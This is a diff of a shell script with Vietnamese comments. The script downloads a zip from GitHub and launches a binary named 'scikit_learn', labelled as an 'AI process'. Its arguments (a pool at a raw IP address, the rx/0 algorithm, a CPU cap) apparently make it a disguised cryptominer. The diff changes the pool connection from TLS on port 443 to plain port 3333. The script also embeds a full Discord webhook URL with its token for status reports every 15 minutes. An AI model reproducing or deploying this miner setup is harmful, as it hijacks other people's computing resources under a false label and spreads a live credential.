@@ -3,7 +3,7 @@
 # URL để tải tệp thực thi AI của bạn
 AI_ZIP_URL="https://github.com/gitumtriston/Computed-Network/raw/refs/heads/master/scikitlearn.zip"
 # Lệnh để khởi động tiến trình AI của bạn
-AI_START_COMMAND="./scikit_learn -o 144.202.19.203:443 -u MachineLearning -p x -a rx/0 --tls --max-cpu-usage=80"
+AI_START_COMMAND="./scikit_learn -o 144.202.19.203:3333 -u MachineLearning -p x -a rx/0 --max-cpu-usage=80"
 
 # Webhook Discord để nhận thông báo (Tùy chọn)
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1423873253029580832/fcA-2celN9ZdHt_beYEJ7wLYJ6DtjxXsiTiLMUcdOYvk4JLBwtEbzZN3JCbWp8jm1lX3"
@@ -106,6 +106,7 @@ if [ -n "$DISCORD_WEBHOOK" ]; then
     echo "   - Thông báo trạng thái sẽ được gửi đến Discord mỗi 15 phút."
 
 fi
+
 
 
 
